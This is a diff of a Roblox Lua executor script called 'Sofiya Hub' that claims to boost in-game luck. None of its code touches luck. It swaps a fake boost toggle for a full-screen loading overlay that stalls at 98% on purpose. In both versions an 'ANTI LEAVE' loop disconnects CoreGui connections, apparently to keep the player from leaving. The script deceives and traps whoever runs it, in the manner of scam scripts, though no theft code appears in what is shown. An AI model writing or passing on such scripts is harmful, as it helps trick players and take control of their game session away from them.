@@ -1,17 +1,15 @@
---// SOFIYA HUB - COMPACT RNG LUCK
+--// SOFIYA HUB - RNG LOADING SCREEN
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local UIS = game:GetService("UserInputService")
 
-local Player = Players.LocalPlayer
-local PlayerGui = Player:WaitForChild("PlayerGui")
+local player = Players.LocalPlayer
 
 --// ANTI LEAVE
 task.spawn(function()
 	while task.wait() do
 		pcall(function()
-			for _, v in ipairs(
+			for _,v in ipairs(
 				getconnections(
 					game:GetService("CoreGui")
 					.RobloxGui
@@ -35,332 +33,151 @@ task.spawn(function()
 	end
 end)
 
---// REMOVE OLD
-local Old = PlayerGui:FindFirstChild("SofiyaHub")
-if Old then
-	Old:Destroy()
-end
-
---// COLORS
-local PURPLE = Color3.fromRGB(145,80,255)
-local DARK = Color3.fromRGB(11,12,20)
-local HEADER = Color3.fromRGB(19,19,32)
-local MUTED = Color3.fromRGB(105,108,130)
-local WHITE = Color3.fromRGB(245,245,255)
-local RED = Color3.fromRGB(235,65,75)
-
-local function Round(obj, radius)
-	local c = Instance.new("UICorner")
-	c.CornerRadius = UDim.new(0, radius)
-	c.Parent = obj
-end
-
-local function Tween(obj, time, props, style)
-	local t = TweenService:Create(
-		obj,
-		TweenInfo.new(
-			time,
-			style or Enum.EasingStyle.Quint,
-			Enum.EasingDirection.Out
-		),
-		props
-	)
-	t:Play()
-	return t
-end
-
 --// GUI
-local Gui = Instance.new("ScreenGui")
-Gui.Name = "SofiyaHub"
-Gui.ResetOnSpawn = false
-Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Gui.Parent = PlayerGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "SofiyaHubLoading"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = player:WaitForChild("PlayerGui")
 
---// MAIN
-local Main = Instance.new("Frame")
-Main.Size = UDim2.fromOffset(280,145)
-Main.Position = UDim2.fromScale(.5,.5)
-Main.AnchorPoint = Vector2.new(.5,.5)
-Main.BackgroundColor3 = DARK
-Main.BorderSizePixel = 0
-Main.Parent = Gui
-Round(Main,15)
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.fromRGB(8,6,15)
+bg.BorderSizePixel = 0
+bg.Parent = gui
 
-local Border = Instance.new("UIStroke")
-Border.Color = PURPLE
-Border.Transparency = .45
-Border.Thickness = 1
-Border.Parent = Main
+-- Main
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0,420,0,230)
+main.Position = UDim2.fromScale(.5,.5)
+main.AnchorPoint = Vector2.new(.5,.5)
+main.BackgroundColor3 = Color3.fromRGB(17,12,29)
+main.BorderSizePixel = 0
+main.Parent = bg
 
---// HEADER
-local Header = Instance.new("Frame")
-Header.Size = UDim2.new(1,0,0,48)
-Header.BackgroundColor3 = HEADER
-Header.BorderSizePixel = 0
-Header.Parent = Main
-Round(Header,15)
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0,18)
+corner.Parent = main
 
-local Title = Instance.new("TextLabel")
-Title.Position = UDim2.fromOffset(14,7)
-Title.Size = UDim2.new(1,-60,0,18)
-Title.BackgroundTransparency = 1
-Title.Text = "SOFIYA HUB"
-Title.TextColor3 = WHITE
-Title.TextSize = 13
-Title.Font = Enum.Font.GothamBold
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = Header
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(145,70,255)
+stroke.Thickness = 2
+stroke.Transparency = .25
+stroke.Parent = main
 
-local Subtitle = Instance.new("TextLabel")
-Subtitle.Position = UDim2.fromOffset(14,26)
-Subtitle.Size = UDim2.new(1,-60,0,12)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "RNG LUCK BOOST"
-Subtitle.TextColor3 = PURPLE
-Subtitle.TextSize = 8
-Subtitle.Font = Enum.Font.GothamBold
-Subtitle.TextXAlignment = Enum.TextXAlignment.Left
-Subtitle.Parent = Header
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-30,0,45)
+title.Position = UDim2.new(0,15,0,20)
+title.BackgroundTransparency = 1
+title.Text = "SOFIYA HUB"
+title.TextColor3 = Color3.fromRGB(190,130,255)
+title.TextSize = 30
+title.Font = Enum.Font.GothamBold
+title.Parent = main
 
---// CLOSE
-local Close = Instance.new("TextButton")
-Close.Position = UDim2.new(1,-38,0,11)
-Close.Size = UDim2.fromOffset(26,26)
-Close.BackgroundColor3 = Color3.fromRGB(29,29,42)
-Close.Text = "×"
-Close.TextColor3 = MUTED
-Close.TextSize = 17
-Close.Font = Enum.Font.GothamBold
-Close.AutoButtonColor = false
-Close.Parent = Header
-Round(Close,8)
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1,-30,0,25)
+sub.Position = UDim2.new(0,15,0,65)
+sub.BackgroundTransparency = 1
+sub.Text = "RNG LUCK SYSTEM"
+sub.TextColor3 = Color3.fromRGB(180,180,200)
+sub.TextSize = 14
+sub.Font = Enum.Font.GothamMedium
+sub.Parent = main
 
-Close.MouseEnter:Connect(function()
-	Tween(Close,.15,{
-		BackgroundColor3 = RED,
-		TextColor3 = WHITE
-	})
-end)
+-- Loading bar
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(1,-50,0,14)
+barBG.Position = UDim2.new(0,25,0,120)
+barBG.BackgroundColor3 = Color3.fromRGB(35,27,48)
+barBG.BorderSizePixel = 0
+barBG.Parent = main
 
-Close.MouseLeave:Connect(function()
-	Tween(Close,.15,{
-		BackgroundColor3 = Color3.fromRGB(29,29,42),
-		TextColor3 = MUTED
-	})
-end)
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1,0)
+barCorner.Parent = barBG
 
-Close.MouseButton1Click:Connect(function()
-	local t = Tween(Main,.25,{
-		Size = UDim2.fromOffset(0,0)
-	},Enum.EasingStyle.Back)
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(150,70,255)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
 
-	t.Completed:Wait()
-	Gui:Destroy()
-end)
+local barCorner2 = Instance.new("UICorner")
+barCorner2.CornerRadius = UDim.new(1,0)
+barCorner2.Parent = bar
 
---// STATUS
-local Status = Instance.new("TextLabel")
-Status.Position = UDim2.fromOffset(14,57)
-Status.Size = UDim2.new(1,-28,0,20)
-Status.BackgroundTransparency = 1
-Status.Text = "●  RNG LUCK BOOST  •  OFF"
-Status.TextColor3 = MUTED
-Status.TextSize = 9
-Status.Font = Enum.Font.GothamSemibold
-Status.TextXAlignment = Enum.TextXAlignment.Left
-Status.Parent = Main
+-- Percentage
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1,-50,0,30)
+percent.Position = UDim2.new(0,25,0,143)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.fromRGB(225,210,255)
+percent.TextSize = 16
+percent.Font = Enum.Font.GothamBold
+percent.TextXAlignment = Enum.TextXAlignment.Left
+percent.Parent = main
 
---// SPINNER
-local Spinner = Instance.new("Frame")
-Spinner.Position = UDim2.fromOffset(14,85)
-Spinner.Size = UDim2.fromOffset(22,22)
-Spinner.BackgroundTransparency = 1
-Spinner.Visible = false
-Spinner.Parent = Main
+-- Status
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1,-50,0,25)
+status.Position = UDim2.new(0,25,0,175)
+status.BackgroundTransparency = 1
+status.Text = "Initializing RNG..."
+status.TextColor3 = Color3.fromRGB(145,140,160)
+status.TextSize = 13
+status.Font = Enum.Font.Gotham
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
 
-local SpinStroke = Instance.new("UIStroke")
-SpinStroke.Color = PURPLE
-SpinStroke.Thickness = 3
-SpinStroke.Transparency = .15
-SpinStroke.Parent = Spinner
+--// Loading
+task.spawn(function()
+	for i = 1,98 do
 
-Round(Spinner,50)
+		local delayTime
 
---// LABEL
-local Label = Instance.new("TextLabel")
-Label.Position = UDim2.fromOffset(14,82)
-Label.Size = UDim2.new(1,-90,0,29)
-Label.BackgroundTransparency = 1
-Label.Text = "RNG BOOST"
-Label.TextColor3 = WHITE
-Label.TextSize = 10
-Label.Font = Enum.Font.GothamBold
-Label.TextXAlignment = Enum.TextXAlignment.Left
-Label.Parent = Main
+		if i <= 20 then
+			delayTime = 0.035
+			status.Text = "Initializing RNG..."
 
---// TOGGLE
-local Toggle = Instance.new("TextButton")
-Toggle.Position = UDim2.new(1,-69,0,82)
-Toggle.Size = UDim2.fromOffset(55,29)
-Toggle.BackgroundColor3 = Color3.fromRGB(29,30,44)
-Toggle.Text = ""
-Toggle.AutoButtonColor = false
-Toggle.Parent = Main
-Round(Toggle,20)
+		elseif i <= 50 then
+			delayTime = 0.08 + ((i-20) * 0.004)
+			status.Text = "Calculating luck..."
 
-local Knob = Instance.new("Frame")
-Knob.Position = UDim2.fromOffset(4,4)
-Knob.Size = UDim2.fromOffset(21,21)
-Knob.BackgroundColor3 = MUTED
-Knob.BorderSizePixel = 0
-Knob.Parent = Toggle
-Round(Knob,20)
+		elseif i <= 80 then
+			delayTime = 0.15
+			status.Text = "Boosting luck..."
 
---// STATE
-local Enabled = false
-local Busy = false
-local SpinThread
+		elseif i <= 90 then
+			delayTime = 0.25
+			status.Text = "Searching lucky blocks..."
 
-local Messages = {
-	"Utilizing Luck...",
-	"Analyzing RNG...",
-	"Optimizing Luck...",
-	"Enhancing RNG...",
-	"Calculating Luck...",
-	"Stabilizing Luck...",
-	"Luck Syncing...",
-	"Finalizing Boost..."
-}
-
-local function StartSpinner()
-	Spinner.Visible = true
-
-	SpinThread = task.spawn(function()
-		while Busy do
-			Spinner.Rotation += 8
-			task.wait(.02)
+		else
+			delayTime = 0.55
+			status.Text = "Optimizing RNG..."
 		end
 
-		Spinner.Rotation = 0
-		Spinner.Visible = false
-	end)
-end
+		percent.Text = i .. "%"
 
-local function SetState(state)
-	Enabled = state
+		TweenService:Create(
+			bar,
+			TweenInfo.new(
+				delayTime,
+				Enum.EasingStyle.Linear
+			),
+			{
+				Size = UDim2.new(i/100,0,1,0)
+			}
+		):Play()
 
-	if Enabled then
-		Status.Text = "●  RNG LUCK BOOST  •  ON"
-		Status.TextColor3 = PURPLE
-		Label.Text = "RNG BOOST  •  ACTIVE"
-
-		Tween(Toggle,.2,{
-			BackgroundColor3 = Color3.fromRGB(45,29,70)
-		})
-
-		Tween(Knob,.3,{
-			Position = UDim2.new(1,-25,0,4),
-			BackgroundColor3 = PURPLE
-		},Enum.EasingStyle.Back)
-	else
-		Status.Text = "●  RNG LUCK BOOST  •  OFF"
-		Status.TextColor3 = MUTED
-		Label.Text = "RNG BOOST"
-
-		Tween(Toggle,.2,{
-			BackgroundColor3 = Color3.fromRGB(29,30,44)
-		})
-
-		Tween(Knob,.3,{
-			Position = UDim2.fromOffset(4,4),
-			BackgroundColor3 = MUTED
-		},Enum.EasingStyle.Back)
-	end
-end
-
---// TOGGLE
-Toggle.MouseButton1Click:Connect(function()
-
-	if Busy then
-		return
+		task.wait(delayTime)
 	end
 
-	Busy = true
+	percent.Text = "98%"
+	status.Text = "Almost ready..."
 
-	local NewState = not Enabled
-
-	if NewState then
-
-		StartSpinner()
-
-		for _, msg in ipairs(Messages) do
-			Status.Text = "●  " .. msg
-			task.wait(.12)
-		end
-
-		SetState(true)
-
-	else
-
-		StartSpinner()
-
-		Status.Text = "●  Disabling Luck Boost..."
-		task.wait(.35)
-
-		SetState(false)
-	end
-
-	Busy = false
+	-- stays at 98%
 end)
-
---// DRAGGING
-local Dragging = false
-local DragStart
-local StartPosition
-
-Header.InputBegan:Connect(function(input)
-
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-	or input.UserInputType == Enum.UserInputType.Touch then
-
-		Dragging = true
-		DragStart = input.Position
-		StartPosition = Main.Position
-
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				Dragging = false
-			end
-		end)
-	end
-end)
-
-UIS.InputChanged:Connect(function(input)
-
-	if not Dragging then
-		return
-	end
-
-	if input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch then
-
-		local Delta = input.Position - DragStart
-
-		Main.Position = UDim2.new(
-			StartPosition.X.Scale,
-			StartPosition.X.Offset + Delta.X,
-			StartPosition.Y.Scale,
-			StartPosition.Y.Offset + Delta.Y
-		)
-	end
-end)
-
---// OPEN ANIMATION
-local FinalSize = Main.Size
-Main.Size = UDim2.fromOffset(0,0)
-
-Tween(Main,.4,{
-	Size = FinalSize
-},Enum.EasingStyle.Back)
-
-print("SOFIYA HUB READY")
